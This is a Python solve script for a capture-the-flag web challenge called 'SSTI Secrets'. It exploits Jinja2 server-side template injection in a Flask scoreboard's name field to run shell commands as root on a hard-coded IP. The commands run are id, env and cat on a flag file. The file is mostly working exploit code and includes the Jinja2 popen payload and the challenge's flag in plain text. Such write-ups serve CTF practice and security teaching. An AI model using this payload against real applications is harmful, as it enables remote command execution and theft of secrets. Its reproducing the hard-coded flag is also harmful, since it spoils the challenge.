#!/usr/bin/env python3
"""SSTI Secrets (web, 300 pts) - http://54.72.82.22:8040

"PLAYER ONE" arcade scoreboard renders the POSTed `name` as a Jinja2 template
server-side -> SSTI -> RCE as root.

  {{7*7}}  -> 49          {{7*"7"}} -> 7777777
  {{config}} -> full Flask Config dump

The flag is injected into the container as the FLAG environment variable
(the in-container /app/app/flag.txt holds the same value).

  env -> FLAG=safctf{287a681f8f9aa898e0743b5b392952b0}
"""
import urllib.request, urllib.parse, re, html

BASE = "http://54.72.82.22:8040"
FLAG = "safctf{287a681f8f9aa898e0743b5b392952b0}"


def render(payload):
    data = urllib.parse.urlencode({"name": payload}).encode()
    req = urllib.request.Request(BASE + "/", data=data)
    with urllib.request.urlopen(req, timeout=15) as r:
        page = r.read().decode("utf-8", "replace")
    m = re.search(r"Welcome, player\s*(.*?)\s*</h2>", page, re.S)
    return html.unescape(m.group(1)) if m else ""


def sh(cmd):
    return render("{{lipsum.__globals__.os.popen(%r).read()}}" % cmd)


def main():
    print("probe {{7*7}} ->", render("{{7*7}}"))
    print("id           ->", sh("id").strip())

    env = sh("env")
    m = re.search(r"FLAG=(\S+)", env)
    print("env FLAG     ->", m.group(1) if m else "(not in env)")
    if not m:
        m = re.search(r"safctf\{[^}]*\}", sh("cat /app/app/flag.txt"))
    assert m and FLAG in m.group(0)


if __name__ == "__main__":
    main()
